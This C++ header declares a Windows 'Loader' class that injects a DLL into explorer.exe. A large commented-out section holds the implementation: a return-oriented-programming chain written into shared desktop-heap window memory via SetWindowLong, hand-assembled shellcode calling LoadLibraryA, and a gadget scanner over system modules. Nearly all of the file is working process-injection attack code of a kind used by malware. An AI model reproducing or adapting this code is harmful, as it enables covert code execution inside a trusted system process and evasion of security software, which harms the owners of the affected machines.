#pragma once

#include <Windows.h>
#include <winternl.h>
#include <tchar.h>

#define LDRTITLE _T("LdrLoadDll")
#define LDRCLASS _T("LdrLoadDllCls")

#define NUM_OF_MAGICS 4

#define EXACT_GADGET 1
#define EXPRESSION_GADGET 2

class Loader
{
public:
	Loader(HINSTANCE hInstance);
	~Loader();

	BOOL Inject(const TCHAR* dllPath);

	PVOID FindLoaderDesktopHeap(SIZE_T *MagicOffset, SIZE_T *size);
	PVOID FindExplorerDesktopHeap(SIZE_T HeapSize);

	PVOID BuildAttackBuffer(const TCHAR* dllPath);


private:
	void SetLibraryPath(const TCHAR* path, UINT& currentIndex);
	void SetLibraryPathW(const TCHAR* path, UINT& currentIndex);

	PBYTE SearchMemory(PBYTE Start, SIZE_T Size, PBYTE Buffer, SIZE_T BufLen);
	ATOM RegisterLoaderClass();

private:
	HINSTANCE m_hInstance;
	HWND m_hWnd;

	SIZE_T m_WindowBufferOffset;
	SIZE_T m_SharedHeapSize;
	PVOID m_pLoaderDesktopHeap;

	DWORD m_dwExplorerPid;
	HANDLE m_hExplorerHandle;

	PVOID m_pExplorerSharedHeap;


	HMODULE m_hShell32;

private:
	
	static ULONG s_Magics[NUM_OF_MAGICS];//{ 0xABABABAB, 0xCDCDCDCD, 0xABABABAB, 0xCDCDCDCD };

	typedef struct _GADGET {
		const CHAR* Gadget;
		UINT  Len;
		const TCHAR* Module;
		PVOID ModuleBase;
		SIZE_T Offset;
		UINT  Type;
	} GADGET, *PGADGET;

	static GADGET s_Gadgets[];
};

//const TCHAR *ModulesList[] = { _T("ntdll.dll"), _T("kernel32.dll"), _T("kernelbase.dll"), _T("user32.dll"), _T("shell32.dll"), NULL };
//PVOID BuildAttackBuffer(HWND window, PVOID ExplorerSharedHeap, SIZE_T WindowBufferOffset)
//{
//	PVOID KiUserApcDispatcher = (PVOID)GetProcAddress(LoadLibrary(_T("ntdll.dll")), "KiUserApcDispatcher");
//	PVOID WriteProcessMemory = (PVOID)GetProcAddress(LoadLibrary(_T("kernel32.dll")), "WriteProcessMemory");
//	PVOID ntchkstk = (PVOID)GetProcAddress(LoadLibrary(_T("ntdll.dll")), "_chkstk");
//	PVOID atan = (PVOID)GetProcAddress(LoadLibrary(_T("ntdll.dll")), "atan");
//	PVOID LoadLibraryAddr = (PVOID)GetProcAddress(LoadLibrary(_T("kernel32.dll")), "LoadLibraryA");
//	UINT CurrIndex = 0;
//	UINT returnedIdx = 0;
//	UINT ShellcodeAddrIndx = 0;
//	UINT ShellcodeStartIndx = 0;
//	UINT LoadedLibraryStrIndx = 0;
//#define SET_LONG(value) SetWindowLong(window, CurrIndex*4, (ULONG)value);CurrIndex++;
//	SET_LONG(GADGET_ADDRESS(Gadgets[5]) + 2); // call eax ret
//	SET_LONG(0xFFFFFFFF); // Current process
//	SET_LONG(atan);       // where to write
//	ShellcodeAddrIndx = CurrIndex;
//	SET_LONG(1);          // what to write
//	SET_LONG(0x70);       // how much to write
//	SET_LONG(0);          // where to write the bytes written.
//	SET_LONG(atan);       // Run shellcode.
//	SET_LONG(6);          // where to land.
//	SET_LONG(7);
//	SET_LONG(8);
//	SET_LONG(9);
//	SET_LONG(10);
//	SET_LONG(11);
//	SET_LONG(12);
//	SET_LONG(13);
//	SET_LONG(14);
//	SET_LONG(15);
//	SET_LONG(16);
//	SET_LONG(17);
//	SET_LONG(18);
//	SET_LONG(0);
//	SET_LONG(GADGET_ADDRESS(Gadgets[1]));
//	SET_LONG(0);
//	SET_LONG(0);
//	SET_LONG(GADGET_ADDRESS(Gadgets[2]));
//	SET_LONG(0x70);
//	SET_LONG(ntchkstk);
//	SET_LONG(WriteProcessMemory);
//	returnedIdx = CurrIndex;
//	SET_LONG((SIZE_T)ExplorerSharedHeap + WindowBufferOffset + (CurrIndex + 4) * 4);
//	SET_LONG(0);
//	SET_LONG(0);
//	SET_LONG(0);
//	SET_LONG(KiUserApcDispatcher);
//	SET_LONG(GADGET_ADDRESS(Gadgets[4]));
//	SET_LONG(GADGET_ADDRESS(Gadgets[0]));
//	LoadedLibraryStrIndx = CurrIndex;
//	SET_LONG(0x785c3a63);
//	SET_LONG(0x6c6c642e); // This is c:\\x.dll
//	SET_LONG(0);
//	ShellcodeStartIndx = CurrIndex;
//	SET_LONG(0x68909090);
//	SET_LONG((SIZE_T)ExplorerSharedHeap + WindowBufferOffset + LoadedLibraryStrIndx * 4);
//	SET_LONG(0xb8909090);
//	SET_LONG((LONG)LoadLibraryAddr);
//	SET_LONG(0x9090d0ff);
//	SET_LONG(0xc35cc483); // Fix stack and return
//	SetWindowLong(window, ShellcodeAddrIndx * 4, (SIZE_T)ExplorerSharedHeap + WindowBufferOffset + ShellcodeStartIndx * 4);
//#undef SET_LONG
//
//	return (PVOID)((SIZE_T)ExplorerSharedHeap + WindowBufferOffset + returnedIdx * 4);
//
//}
//
//PBYTE SearchMemoryExpression(PBYTE Start, SIZE_T Size, PBYTE Buffer, SIZE_T BufLen)
//{
//	while (Size > BufLen)
//	{
//		UINT i = 0;
//		for (; i < BufLen; i++)
//		{
//			if (Buffer[i] == '?')
//				continue;
//			else if (Buffer[i] != Start[i])
//				break;
//		}
//
//		if (i >= BufLen)
//			return Start;
//
//		Start++;
//		Size--;
//	}
//	return NULL;
//}
//
//BOOL FindGadgets(HANDLE TargetProcess)
//{
//	UINT i = 0;
//	UINT j = 0;
//	HMODULE Module;
//	const TCHAR *ModuleName = NULL;
//	MEMORY_BASIC_INFORMATION MemInfo = { 0 };
//	PBYTE RegionStart;
//	PBYTE GadgetStart;
//	BOOL FoundGadget = FALSE;
//	TCHAR Name[MAX_PATH + 1] = { 0 };
//
//	while (Gadgets[i].Gadget)
//	{
//		j = 0;
//
//		FoundGadget = FALSE;
//
//		while (!FoundGadget && ModulesList[j])
//		{
//			Module = GetModuleHandle(ModulesList[j]);
//
//			RegionStart = (PBYTE)Module;
//
//			while (!FoundGadget && VirtualQuery(RegionStart, &MemInfo, sizeof(MemInfo)) && MemInfo.AllocationBase == (PVOID)Module)
//			{
//				if (MemInfo.State == MEM_COMMIT && MemInfo.Type == MEM_IMAGE && (MemInfo.Protect == PAGE_EXECUTE || MemInfo.Protect == PAGE_EXECUTE_READ))
//				{
//					if (Gadgets[i].Type == EXACT_GADGET)
//					{
//						GadgetStart = SearchMemory((PBYTE)MemInfo.BaseAddress, MemInfo.RegionSize, (PBYTE)Gadgets[i].Gadget, Gadgets[i].Len);
//					}
//					else
//					{
//						GadgetStart = ExpressionSearchMemory((PBYTE)MemInfo.BaseAddress, MemInfo.RegionSize, (PBYTE)Gadgets[i].Gadget, Gadgets[i].Len);
//					}
//
//					if (GadgetStart)
//					{
//						Gadgets[i].Module = ModulesList[j];
//						Gadgets[i].ModuleBase = Module;
//						Gadgets[i].Offset = (SIZE_T)GadgetStart - (SIZE_T)Module;
//
//						FoundGadget = TRUE;
//						break;
//					}
//				}
//				RegionStart += MemInfo.RegionSize;
//			}
//
//			j++;
//		}
//
//		if (!FoundGadget)
//			return FALSE;
//
//		i++;
//	}
//	return TRUE;
//}